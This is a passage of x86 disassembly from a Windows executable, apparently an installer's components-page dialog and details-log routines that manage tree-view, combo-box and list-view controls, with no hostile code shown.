  405051:	57                   	push   %edi
  405052:	68 1c 11 00 00       	push   $0x111c
  405057:	ff 75 fc             	push   -0x4(%ebp)
  40505a:	ff d6                	call   *%esi
  40505c:	83 f8 10             	cmp    $0x10,%eax
  40505f:	7d 0d                	jge    0x40506e
  405061:	57                   	push   %edi
  405062:	6a 10                	push   $0x10
  405064:	68 1b 11 00 00       	push   $0x111b
  405069:	ff 75 fc             	push   -0x4(%ebp)
  40506c:	ff d6                	call   *%esi
  40506e:	53                   	push   %ebx
  40506f:	ff 15 54 80 40 00    	call   *0x408054
  405075:	33 db                	xor    %ebx,%ebx
  405077:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40507a:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  40507d:	3b c7                	cmp    %edi,%eax
  40507f:	74 27                	je     0x4050a8
  405081:	83 fb 20             	cmp    $0x20,%ebx
  405084:	74 03                	je     0x405089
  405086:	89 7d f0             	mov    %edi,-0x10(%ebp)
  405089:	50                   	push   %eax
  40508a:	57                   	push   %edi
  40508b:	e8 36 15 00 00       	call   0x4065c6
  405090:	50                   	push   %eax
  405091:	57                   	push   %edi
  405092:	68 43 01 00 00       	push   $0x143
  405097:	ff 75 f8             	push   -0x8(%ebp)
  40509a:	ff d6                	call   *%esi
  40509c:	53                   	push   %ebx
  40509d:	50                   	push   %eax
  40509e:	68 51 01 00 00       	push   $0x151
  4050a3:	ff 75 f8             	push   -0x8(%ebp)
  4050a6:	ff d6                	call   *%esi
  4050a8:	43                   	inc    %ebx
  4050a9:	83 fb 21             	cmp    $0x21,%ebx
  4050ac:	7c c9                	jl     0x405077
  4050ae:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4050b1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050b4:	ff 74 83 30          	push   0x30(%ebx,%eax,4)
  4050b8:	6a 15                	push   $0x15
  4050ba:	ff 75 08             	push   0x8(%ebp)
  4050bd:	e8 46 f4 ff ff       	call   0x404508
  4050c2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050c5:	ff 74 83 34          	push   0x34(%ebx,%eax,4)
  4050c9:	6a 16                	push   $0x16
  4050cb:	ff 75 08             	push   0x8(%ebp)
  4050ce:	e8 35 f4 ff ff       	call   0x404508
  4050d3:	33 db                	xor    %ebx,%ebx
  4050d5:	39 3d 4c 9a 42 00    	cmp    %edi,0x429a4c
  4050db:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4050de:	0f 8e ca 00 00 00    	jle    0x4051ae
  4050e4:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4050e7:	8d 50 08             	lea    0x8(%eax),%edx
  4050ea:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4050ed:	8d 42 10             	lea    0x10(%edx),%eax
  4050f0:	66 39 38             	cmp    %di,(%eax)
  4050f3:	0f 84 97 00 00 00    	je     0x405190
  4050f9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4050fc:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4050ff:	8b 02                	mov    (%edx),%eax
  405101:	6a 20                	push   $0x20
  405103:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  405106:	59                   	pop    %ecx
  405107:	8b d0                	mov    %eax,%edx
  405109:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  405110:	23 d1                	and    %ecx,%edx
  405112:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  405119:	a8 02                	test   $0x2,%al
  40511b:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  40511e:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  405121:	89 55 bc             	mov    %edx,-0x44(%ebp)
  405124:	74 3a                	je     0x405160
  405126:	8d 45 ac             	lea    -0x54(%ebp),%eax
  405129:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  405130:	50                   	push   %eax
  405131:	57                   	push   %edi
  405132:	68 32 11 00 00       	push   $0x1132
  405137:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  40513e:	ff 75 fc             	push   -0x4(%ebp)
  405141:	ff d6                	call   *%esi
  405143:	8b 0d 00 2f 42 00    	mov    0x422f00,%ecx
  405149:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  405150:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  405153:	a1 00 2f 42 00       	mov    0x422f00,%eax
  405158:	8b 04 98             	mov    (%eax,%ebx,4),%eax
  40515b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40515e:	eb 30                	jmp    0x405190
  405160:	a8 04                	test   $0x4,%al
  405162:	74 14                	je     0x405178
  405164:	ff 75 f4             	push   -0xc(%ebp)
  405167:	6a 03                	push   $0x3
  405169:	68 0a 11 00 00       	push   $0x110a
  40516e:	ff 75 fc             	push   -0x4(%ebp)
  405171:	ff d6                	call   *%esi
  405173:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405176:	eb 18                	jmp    0x405190
  405178:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40517b:	50                   	push   %eax
  40517c:	57                   	push   %edi
  40517d:	68 32 11 00 00       	push   $0x1132
  405182:	ff 75 fc             	push   -0x4(%ebp)
  405185:	ff d6                	call   *%esi
  405187:	8b 0d 00 2f 42 00    	mov    0x422f00,%ecx
  40518d:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  405190:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  405193:	43                   	inc    %ebx
  405194:	81 c2 18 08 00 00    	add    $0x818,%edx
  40519a:	3b 1d 4c 9a 42 00    	cmp    0x429a4c,%ebx
  4051a0:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  4051a3:	0f 8c 44 ff ff ff    	jl     0x4050ed
  4051a9:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  4051ac:	75 19                	jne    0x4051c7
  4051ae:	6a f0                	push   $0xfffffff0
  4051b0:	ff 75 fc             	push   -0x4(%ebp)
  4051b3:	ff 15 d4 81 40 00    	call   *0x4081d4
  4051b9:	24 fb                	and    $0xfb,%al
  4051bb:	50                   	push   %eax
  4051bc:	6a f0                	push   $0xfffffff0
  4051be:	ff 75 fc             	push   -0x4(%ebp)
  4051c1:	ff 15 40 82 40 00    	call   *0x408240
  4051c7:	39 7d f0             	cmp    %edi,-0x10(%ebp)
  4051ca:	75 18                	jne    0x4051e4
  4051cc:	6a 05                	push   $0x5
  4051ce:	ff 75 f8             	push   -0x8(%ebp)
  4051d1:	ff 15 28 82 40 00    	call   *0x408228
  4051d7:	ff 75 f8             	push   -0x8(%ebp)
  4051da:	e8 5e f3 ff ff       	call   0x40453d
  4051df:	e9 89 03 00 00       	jmp    0x40556d
  4051e4:	ff 75 fc             	push   -0x4(%ebp)
  4051e7:	e8 51 f3 ff ff       	call   0x40453d
  4051ec:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4051f3:	75 12                	jne    0x405207
  4051f5:	33 c9                	xor    %ecx,%ecx
  4051f7:	89 7d 10             	mov    %edi,0x10(%ebp)
  4051fa:	41                   	inc    %ecx
  4051fb:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  405202:	89 4d 14             	mov    %ecx,0x14(%ebp)
  405205:	eb 03                	jmp    0x40520a
  405207:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40520a:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  40520e:	b8 13 04 00 00       	mov    $0x413,%eax
  405213:	74 09                	je     0x40521e
  405215:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405218:	0f 85 e4 00 00 00    	jne    0x405302
  40521e:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405221:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405224:	74 0d                	je     0x405233
  405226:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  40522d:	0f 85 cf 00 00 00    	jne    0x405302
  405233:	f6 05 39 9a 42 00 02 	testb  $0x2,0x429a39
  40523a:	75 73                	jne    0x4052af
  40523c:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40523f:	74 09                	je     0x40524a
  405241:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405244:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  405248:	75 65                	jne    0x4052af
  40524a:	33 c9                	xor    %ecx,%ecx
  40524c:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40524f:	0f 95 c1             	setne  %cl
  405252:	51                   	push   %ecx
  405253:	ff 75 fc             	push   -0x4(%ebp)
  405256:	e8 68 fc ff ff       	call   0x404ec3
  40525b:	8b d8                	mov    %eax,%ebx
  40525d:	3b df                	cmp    %edi,%ebx
  40525f:	7c 4e                	jl     0x4052af
  405261:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  405267:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40526a:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  40526e:	8b 01                	mov    (%ecx),%eax
  405270:	a8 10                	test   $0x10,%al
  405272:	75 3b                	jne    0x4052af
  405274:	a8 40                	test   $0x40,%al
  405276:	74 11                	je     0x405289
  405278:	35 80 00 00 00       	xor    $0x80,%eax
  40527d:	84 c0                	test   %al,%al
  40527f:	79 04                	jns    0x405285
  405281:	0c 01                	or     $0x1,%al
  405283:	eb 07                	jmp    0x40528c
  405285:	24 fe                	and    $0xfe,%al
  405287:	eb 03                	jmp    0x40528c
  405289:	83 f0 01             	xor    $0x1,%eax
  40528c:	53                   	push   %ebx
  40528d:	89 01                	mov    %eax,(%ecx)
  40528f:	e8 e9 be ff ff       	call   0x40117d
  405294:	a1 38 9a 42 00       	mov    0x429a38,%eax
  405299:	43                   	inc    %ebx
  40529a:	f7 d0                	not    %eax
  40529c:	c1 e8 08             	shr    $0x8,%eax
  40529f:	83 e0 01             	and    $0x1,%eax
  4052a2:	89 5d 10             	mov    %ebx,0x10(%ebp)
  4052a5:	89 45 14             	mov    %eax,0x14(%ebp)
  4052a8:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4052af:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  4052b2:	74 4e                	je     0x405302
  4052b4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052b7:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  4052be:	75 0e                	jne    0x4052ce
  4052c0:	ff 70 5c             	push   0x5c(%eax)
  4052c3:	57                   	push   %edi
  4052c4:	68 19 04 00 00       	push   $0x419
  4052c9:	ff 75 fc             	push   -0x4(%ebp)
  4052cc:	ff d6                	call   *%esi
  4052ce:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052d1:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  4052d8:	75 28                	jne    0x405302
  4052da:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  4052de:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4052e1:	8b 40 5c             	mov    0x5c(%eax),%eax
  4052e4:	75 0f                	jne    0x4052f5
  4052e6:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  4052ec:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  4052f0:	83 08 20             	orl    $0x20,(%eax)
  4052f3:	eb 0d                	jmp    0x405302
  4052f5:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  4052fb:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  4052ff:	83 20 df             	andl   $0xffffffdf,(%eax)
  405302:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405309:	75 6f                	jne    0x40537a
  40530b:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  405311:	0f 85 56 02 00 00    	jne    0x40556d
  405317:	8b 45 10             	mov    0x10(%ebp),%eax
  40531a:	c1 e8 10             	shr    $0x10,%eax
  40531d:	66 3d 01 00          	cmp    $0x1,%ax
  405321:	0f 85 46 02 00 00    	jne    0x40556d
  405327:	57                   	push   %edi
  405328:	57                   	push   %edi
  405329:	68 47 01 00 00       	push   $0x147
  40532e:	ff 75 f8             	push   -0x8(%ebp)
  405331:	ff d6                	call   *%esi
  405333:	83 f8 ff             	cmp    $0xffffffff,%eax
  405336:	0f 84 31 02 00 00    	je     0x40556d
  40533c:	57                   	push   %edi
  40533d:	50                   	push   %eax
  40533e:	68 50 01 00 00       	push   $0x150
  405343:	ff 75 f8             	push   -0x8(%ebp)
  405346:	ff d6                	call   *%esi
  405348:	8b d8                	mov    %eax,%ebx
  40534a:	83 fb ff             	cmp    $0xffffffff,%ebx
  40534d:	74 08                	je     0x405357
  40534f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405352:	39 3c 98             	cmp    %edi,(%eax,%ebx,4)
  405355:	75 03                	jne    0x40535a
  405357:	6a 20                	push   $0x20
  405359:	5b                   	pop    %ebx
  40535a:	53                   	push   %ebx
  40535b:	e8 39 bf ff ff       	call   0x401299
  405360:	53                   	push   %ebx
  405361:	57                   	push   %edi
  405362:	68 20 04 00 00       	push   $0x420
  405367:	ff 75 08             	push   0x8(%ebp)
  40536a:	ff d6                	call   *%esi
  40536c:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  405370:	89 7d 14             	mov    %edi,0x14(%ebp)
  405373:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40537a:	b8 00 02 00 00       	mov    $0x200,%eax
  40537f:	39 45 0c             	cmp    %eax,0xc(%ebp)
  405382:	75 08                	jne    0x40538c
  405384:	57                   	push   %edi
  405385:	57                   	push   %edi
  405386:	50                   	push   %eax
  405387:	ff 75 fc             	push   -0x4(%ebp)
  40538a:	ff d6                	call   *%esi
  40538c:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  405393:	75 32                	jne    0x4053c7
  405395:	a1 ec 2e 42 00       	mov    0x422eec,%eax
  40539a:	3b c7                	cmp    %edi,%eax
  40539c:	74 07                	je     0x4053a5
  40539e:	50                   	push   %eax
  40539f:	ff 15 34 80 40 00    	call   *0x408034
  4053a5:	a1 00 2f 42 00       	mov    0x422f00,%eax
  4053aa:	3b c7                	cmp    %edi,%eax
  4053ac:	74 07                	je     0x4053b5
  4053ae:	50                   	push   %eax
  4053af:	ff 15 0c 81 40 00    	call   *0x40810c
  4053b5:	89 3d ec 2e 42 00    	mov    %edi,0x422eec
  4053bb:	89 3d 00 2f 42 00    	mov    %edi,0x422f00
  4053c1:	89 3d 80 9a 42 00    	mov    %edi,0x429a80
  4053c7:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4053ce:	0f 85 5b 01 00 00    	jne    0x40552f
  4053d4:	57                   	push   %edi
  4053d5:	57                   	push   %edi
  4053d6:	e8 14 be ff ff       	call   0x4011ef
  4053db:	8b 45 10             	mov    0x10(%ebp),%eax
  4053de:	3b c7                	cmp    %edi,%eax
  4053e0:	74 0e                	je     0x4053f0
  4053e2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4053e5:	74 01                	je     0x4053e8
  4053e7:	48                   	dec    %eax
  4053e8:	50                   	push   %eax
  4053e9:	6a 08                	push   $0x8
  4053eb:	e8 53 fb ff ff       	call   0x404f43
  4053f0:	39 7d 14             	cmp    %edi,0x14(%ebp)
  4053f3:	74 3f                	je     0x405434
  4053f5:	ff 35 00 2f 42 00    	push   0x422f00
  4053fb:	e8 e2 be ff ff       	call   0x4012e2
  405400:	8b d8                	mov    %eax,%ebx
  405402:	53                   	push   %ebx
  405403:	e8 91 be ff ff       	call   0x401299
  405408:	33 c0                	xor    %eax,%eax
  40540a:	33 c9                	xor    %ecx,%ecx
  40540c:	3b df                	cmp    %edi,%ebx
  40540e:	7e 0e                	jle    0x40541e
  405410:	8b 55 e8             	mov    -0x18(%ebp),%edx
  405413:	39 3c 82             	cmp    %edi,(%edx,%eax,4)
  405416:	74 01                	je     0x405419
  405418:	41                   	inc    %ecx
  405419:	40                   	inc    %eax
  40541a:	3b c3                	cmp    %ebx,%eax
  40541c:	7c f2                	jl     0x405410
  40541e:	57                   	push   %edi
  40541f:	51                   	push   %ecx
  405420:	68 4e 01 00 00       	push   $0x14e
  405425:	ff 75 f8             	push   -0x8(%ebp)
  405428:	ff d6                	call   *%esi
  40542a:	89 5d 14             	mov    %ebx,0x14(%ebp)
  40542d:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  405434:	57                   	push   %edi
  405435:	57                   	push   %edi
  405436:	e8 b4 bd ff ff       	call   0x4011ef
  40543b:	a1 00 2f 42 00       	mov    0x422f00,%eax
  405440:	39 3d 4c 9a 42 00    	cmp    %edi,0x429a4c
  405446:	89 45 e0             	mov    %eax,-0x20(%ebp)
  405449:	a1 48 9a 42 00       	mov    0x429a48,%eax
  40544e:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  405455:	89 7d ec             	mov    %edi,-0x14(%ebp)
  405458:	0f 8e 9c 00 00 00    	jle    0x4054fa
  40545e:	8d 58 08             	lea    0x8(%eax),%ebx
  405461:	8b 45 e0             	mov    -0x20(%ebp),%eax
  405464:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405467:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  40546a:	3b c7                	cmp    %edi,%eax
  40546c:	74 74                	je     0x4054e2
  40546e:	8b 0b                	mov    (%ebx),%ecx
  405470:	89 45 bc             	mov    %eax,-0x44(%ebp)
  405473:	f6 c5 01             	test   $0x1,%ch
  405476:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  40547d:	74 11                	je     0x405490
  40547f:	8d 43 10             	lea    0x10(%ebx),%eax
  405482:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  405489:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40548c:	80 63 01 fe          	andb   $0xfe,0x1(%ebx)
  405490:	f6 c1 40             	test   $0x40,%cl
  405493:	74 05                	je     0x40549a
  405495:	6a 03                	push   $0x3
  405497:	58                   	pop    %eax
  405498:	eb 0e                	jmp    0x4054a8
  40549a:	8b c1                	mov    %ecx,%eax
  40549c:	83 e0 01             	and    $0x1,%eax
  40549f:	40                   	inc    %eax
  4054a0:	f6 c1 10             	test   $0x10,%cl
  4054a3:	74 03                	je     0x4054a8
  4054a5:	83 c0 03             	add    $0x3,%eax
  4054a8:	8b d1                	mov    %ecx,%edx
  4054aa:	ff 75 bc             	push   -0x44(%ebp)
  4054ad:	c1 e0 0b             	shl    $0xb,%eax
  4054b0:	83 e2 08             	and    $0x8,%edx
  4054b3:	0b c2                	or     %edx,%eax
  4054b5:	8b d1                	mov    %ecx,%edx
  4054b7:	c1 f9 05             	sar    $0x5,%ecx
  4054ba:	03 c0                	add    %eax,%eax
  4054bc:	83 e2 20             	and    $0x20,%edx
  4054bf:	83 e1 01             	and    $0x1,%ecx
  4054c2:	0b c2                	or     %edx,%eax
  4054c4:	41                   	inc    %ecx
  4054c5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4054c8:	51                   	push   %ecx
  4054c9:	68 02 11 00 00       	push   $0x1102
  4054ce:	ff 75 fc             	push   -0x4(%ebp)
  4054d1:	ff d6                	call   *%esi
  4054d3:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4054d6:	50                   	push   %eax
  4054d7:	57                   	push   %edi
  4054d8:	68 3f 11 00 00       	push   $0x113f
  4054dd:	ff 75 fc             	push   -0x4(%ebp)
  4054e0:	ff d6                	call   *%esi
  4054e2:	ff 45 ec             	incl   -0x14(%ebp)
  4054e5:	81 c3 18 08 00 00    	add    $0x818,%ebx
  4054eb:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4054ee:	3b 05 4c 9a 42 00    	cmp    0x429a4c,%eax
  4054f4:	0f 8c 67 ff ff ff    	jl     0x405461
  4054fa:	66 81 3d de 9a 42 00 	cmpw   $0x400,0x429ade
  405501:	00 04 
  405503:	75 0c                	jne    0x405511
  405505:	6a 01                	push   $0x1
  405507:	57                   	push   %edi
  405508:	ff 75 fc             	push   -0x4(%ebp)
  40550b:	ff 15 54 82 40 00    	call   *0x408254
  405511:	a1 fc 89 42 00       	mov    0x4289fc,%eax
  405516:	39 78 10             	cmp    %edi,0x10(%eax)
  405519:	74 14                	je     0x40552f
  40551b:	6a 05                	push   $0x5
  40551d:	e8 74 f9 ff ff       	call   0x404e96
  405522:	50                   	push   %eax
  405523:	6a fb                	push   $0xfffffffb
  405525:	68 ff 03 00 00       	push   $0x3ff
  40552a:	e8 4f f9 ff ff       	call   0x404e7e
  40552f:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  405536:	75 35                	jne    0x40556d
  405538:	f6 05 39 9a 42 00 01 	testb  $0x1,0x429a39
  40553f:	74 2c                	je     0x40556d
  405541:	33 c0                	xor    %eax,%eax
  405543:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  405547:	8b 35 28 82 40 00    	mov    0x408228,%esi
  40554d:	0f 94 c0             	sete   %al
  405550:	c1 e0 03             	shl    $0x3,%eax
  405553:	8b f8                	mov    %eax,%edi
  405555:	57                   	push   %edi
  405556:	ff 75 fc             	push   -0x4(%ebp)
  405559:	ff d6                	call   *%esi
  40555b:	57                   	push   %edi
  40555c:	68 fe 03 00 00       	push   $0x3fe
  405561:	ff 75 08             	push   0x8(%ebp)
  405564:	ff 15 3c 82 40 00    	call   *0x40823c
  40556a:	50                   	push   %eax
  40556b:	ff d6                	call   *%esi
  40556d:	ff 75 14             	push   0x14(%ebp)
  405570:	ff 75 10             	push   0x10(%ebp)
  405573:	ff 75 0c             	push   0xc(%ebp)
  405576:	e8 f4 ef ff ff       	call   0x40456f
  40557b:	5f                   	pop    %edi
  40557c:	5e                   	pop    %esi
  40557d:	5b                   	pop    %ebx
  40557e:	c9                   	leave
  40557f:	c2 10 00             	ret    $0x10
  405582:	55                   	push   %ebp
  405583:	8b ec                	mov    %esp,%ebp
  405585:	53                   	push   %ebx
  405586:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405589:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  40558f:	57                   	push   %edi
  405590:	75 14                	jne    0x4055a6
  405592:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  405596:	75 59                	jne    0x4055f1
  405598:	68 13 04 00 00       	push   $0x413
  40559d:	e8 b2 ef ff ff       	call   0x404554
  4055a2:	33 c0                	xor    %eax,%eax
  4055a4:	eb 62                	jmp    0x405608
  4055a6:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  4055ac:	75 20                	jne    0x4055ce
  4055ae:	ff 75 08             	push   0x8(%ebp)
  4055b1:	ff 15 b4 81 40 00    	call   *0x4081b4
  4055b7:	85 c0                	test   %eax,%eax
  4055b9:	74 36                	je     0x4055f1
  4055bb:	6a 01                	push   $0x1
  4055bd:	ff 75 08             	push   0x8(%ebp)
  4055c0:	e8 fe f8 ff ff       	call   0x404ec3
  4055c5:	8b f8                	mov    %eax,%edi
  4055c7:	bb 19 04 00 00       	mov    $0x419,%ebx
  4055cc:	eb 03                	jmp    0x4055d1
  4055ce:	8b 7d 14             	mov    0x14(%ebp),%edi
  4055d1:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  4055d7:	75 1b                	jne    0x4055f4
  4055d9:	39 3d f4 2e 42 00    	cmp    %edi,0x422ef4
  4055df:	74 13                	je     0x4055f4
  4055e1:	57                   	push   %edi
  4055e2:	6a 06                	push   $0x6
  4055e4:	89 3d f4 2e 42 00    	mov    %edi,0x422ef4
  4055ea:	e8 54 f9 ff ff       	call   0x404f43
  4055ef:	eb 03                	jmp    0x4055f4
  4055f1:	8b 7d 14             	mov    0x14(%ebp),%edi
  4055f4:	57                   	push   %edi
  4055f5:	ff 75 10             	push   0x10(%ebp)
  4055f8:	53                   	push   %ebx
  4055f9:	ff 75 08             	push   0x8(%ebp)
  4055fc:	ff 35 fc 2e 42 00    	push   0x422efc
  405602:	ff 15 b8 81 40 00    	call   *0x4081b8
  405608:	5f                   	pop    %edi
  405609:	5b                   	pop    %ebx
  40560a:	5d                   	pop    %ebp
  40560b:	c2 10 00             	ret    $0x10
  40560e:	55                   	push   %ebp
  40560f:	8b ec                	mov    %esp,%ebp
  405611:	83 ec 30             	sub    $0x30,%esp
  405614:	a1 04 8a 42 00       	mov    0x428a04,%eax
  405619:	53                   	push   %ebx
  40561a:	56                   	push   %esi
  40561b:	57                   	push   %edi
  40561c:	33 ff                	xor    %edi,%edi
  40561e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405621:	3b c7                	cmp    %edi,%eax
  405623:	0f 84 b1 00 00 00    	je     0x4056da
  405629:	8b 1d d4 9a 42 00    	mov    0x429ad4,%ebx
  40562f:	be e8 1e 42 00       	mov    $0x421ee8,%esi
  405634:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  405637:	83 e3 01             	and    $0x1,%ebx
  40563a:	75 09                	jne    0x405645
  40563c:	ff 75 08             	push   0x8(%ebp)
  40563f:	56                   	push   %esi
  405640:	e8 81 0f 00 00       	call   0x4065c6
  405645:	56                   	push   %esi
  405646:	e8 54 0f 00 00       	call   0x40659f
  40564b:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  40564e:	89 45 08             	mov    %eax,0x8(%ebp)
  405651:	74 1b                	je     0x40566e
  405653:	ff 75 0c             	push   0xc(%ebp)
  405656:	e8 44 0f 00 00       	call   0x40659f
  40565b:	03 45 08             	add    0x8(%ebp),%eax
  40565e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  405663:	73 75                	jae    0x4056da
  405665:	ff 75 0c             	push   0xc(%ebp)
  405668:	56                   	push   %esi
  405669:	e8 37 0f 00 00       	call   0x4065a5
  40566e:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  405672:	75 0d                	jne    0x405681
  405674:	56                   	push   %esi
  405675:	ff 35 e8 89 42 00    	push   0x4289e8
  40567b:	ff 15 1c 82 40 00    	call   *0x40821c
  405681:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  405685:	75 44                	jne    0x4056cb
  405687:	57                   	push   %edi
  405688:	57                   	push   %edi
  405689:	68 04 10 00 00       	push   $0x1004
  40568e:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  405691:	ff 75 fc             	push   -0x4(%ebp)
  405694:	8b 35 58 82 40 00    	mov    0x408258,%esi
  40569a:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  4056a1:	ff d6                	call   *%esi
  4056a3:	2b c3                	sub    %ebx,%eax
  4056a5:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4056a8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4056ab:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4056ae:	50                   	push   %eax
  4056af:	b8 4d 10 00 00       	mov    $0x104d,%eax
  4056b4:	2b c3                	sub    %ebx,%eax
  4056b6:	57                   	push   %edi
  4056b7:	50                   	push   %eax
  4056b8:	ff 75 fc             	push   -0x4(%ebp)
  4056bb:	ff d6                	call   *%esi
  4056bd:	57                   	push   %edi
  4056be:	ff 75 d4             	push   -0x2c(%ebp)
  4056c1:	68 13 10 00 00       	push   $0x1013
  4056c6:	ff 75 fc             	push   -0x4(%ebp)
  4056c9:	ff d6                	call   *%esi
  4056cb:	3b df                	cmp    %edi,%ebx
  4056cd:	74 0b                	je     0x4056da
  4056cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4056d2:	66 89 3c 45 e8 1e 42 	mov    %di,0x421ee8(,%eax,2)
  4056d9:	00 
  4056da:	5f                   	pop    %edi
  4056db:	5e                   	pop    %esi
  4056dc:	5b                   	pop    %ebx
  4056dd:	c9                   	leave
  4056de:	c2 08 00             	ret    $0x8
  4056e1:	56                   	push   %esi
  4056e2:	8b 35 48 9a 42 00    	mov    0x429a48,%esi
  4056e8:	57                   	push   %edi
  4056e9:	8b 3d 4c 9a 42 00    	mov    0x429a4c,%edi
  4056ef:	6a 00                	push   $0x0
  4056f1:	ff 15 98 82 40 00    	call   *0x408298
  4056f7:	09 05 e0 9a 42 00    	or     %eax,0x429ae0
  4056fd:	6a 00                	push   $0x0
  4056ff:	e8 50 ee ff ff       	call   0x404554
  405704:	85 ff                	test   %edi,%edi
  405706:	74 2b                	je     0x405733
  405708:	83 c6 0c             	add    $0xc,%esi
  40570b:	4f                   	dec    %edi
  40570c:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405710:	74 0f                	je     0x405721
  405712:	ff 74 24 0c          	push   0xc(%esp)
  405716:	ff 36                	push   (%esi)
  405718:	e8 6c bc ff ff       	call   0x401389
  40571d:	85 c0                	test   %eax,%eax
  40571f:	75 0c                	jne    0x40572d
  405721:	81 c6 18 08 00 00    	add    $0x818,%esi
  405727:	85 ff                	test   %edi,%edi
  405729:	75 e0                	jne    0x40570b
  40572b:	eb 06                	jmp    0x405733
  40572d:	ff 05 ac 9a 42 00    	incl   0x429aac
  405733:	68 04 04 00 00       	push   $0x404
  405738:	e8 17 ee ff ff       	call   0x404554
  40573d:	ff 15 94 82 40 00    	call   *0x408294
  405743:	a1 ac 9a 42 00       	mov    0x429aac,%eax
  405748:	5f                   	pop    %edi
  405749:	5e                   	pop    %esi
  40574a:	c2 04 00             	ret    $0x4
  40574d:	55                   	push   %ebp
  40574e:	8b ec                	mov    %esp,%ebp
  405750:	83 ec 40             	sub    $0x40,%esp
  405753:	53                   	push   %ebx
  405754:	56                   	push   %esi
  405755:	8b 35 04 8a 42 00    	mov    0x428a04,%esi
  40575b:	33 db                	xor    %ebx,%ebx
